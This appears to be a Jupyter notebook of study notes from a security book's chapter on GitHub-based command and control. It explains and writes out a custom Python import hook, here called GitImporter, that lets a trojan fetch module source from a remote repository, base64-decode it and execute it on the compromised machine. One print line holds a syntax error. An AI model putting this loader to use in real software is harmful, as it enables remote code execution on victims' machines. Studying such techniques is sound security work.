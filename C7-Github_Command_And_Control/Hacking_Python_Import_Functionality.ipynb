{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "provenance": [],
      "authorship_tag": "ABX9TyNgdRcoBvl56Sjx6MMs5kGP",
      "include_colab_link": true
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "language_info": {
      "name": "python"
    }
  },
  "cells": [
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "view-in-github",
        "colab_type": "text"
      },
      "source": [
        "<a href=\"https://colab.research.google.com/github/damianiRiccardo90/BHP/blob/master/C7-Github_Command_And_Control/Hacking_Python_Import_Functionality.ipynb\" target=\"_parent\"><img src=\"https://colab.research.google.com/assets/colab-badge.svg\" alt=\"Open In Colab\"/></a>"
      ]
    },
    {
      "cell_type": "markdown",
      "source": [
        "### *__Hacking Python's import Functionality__*\n",
        "\n",
        "If you've made it this far in the book, you know that we use Python's __import__ functionality to copy external libraries into our programs so we can use their code. We want to be able to do the same thing for our trojan. But since we're controlling a remote machine, we may want to use a package not available on that machine, and there's no easy way to install packages remotely. Beyond that, we also want to make sure that if we pull in a dependency, such as __Scapy__, our trojan makes that module available to all other modules that we pull in.\n",
        "\n",
        "Python allows us to customize how it imports modules; if it can't find a module locally, it will call an import class we define, which will allow us to remotely retrieve the library from our repo. We'll have to add our custom class to the __sys.meta_path__ list. Let's create this class now by adding the following code:"
      ],
      "metadata": {
        "id": "gV_0zGCxQxeP"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "class GitImporter:\n",
        "    def __init__(self):\n",
        "        self.current_module_code = ''\n",
        "\n",
        "    def find_module(self, name, path=None):\n",
        "        print('[*] Attempting to retrieve %s' %s name)\n",
        "        self.repo = github_connect()\n",
        "        new_library = get_file_contents('modules', f'{name}.py', self.repo)\n",
        "        if new_library is not None:\n",
        "            self.current_module_code = base64.b64decode(new_library) #[1]\n",
        "            return self\n",
        "\n",
        "    def load_module(self, name):\n",
        "        spec = importlib.util.spec_from_loader(name, loader=None,\n",
        "                                               origin=self.repo.git_url)\n",
        "        new_module = importlib.util.module_from_spec(spec) #[2]\n",
        "        exec(self.current_module_code, new_module.__dict__)\n",
        "        sys.modules[spec.name] = new_module #[3]\n",
        "        return new_module"
      ],
      "metadata": {
        "id": "ggK42k5xSpYF"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "source": [],
      "metadata": {
        "id": "eFv167WPU4g6"
      }
    }
  ]
}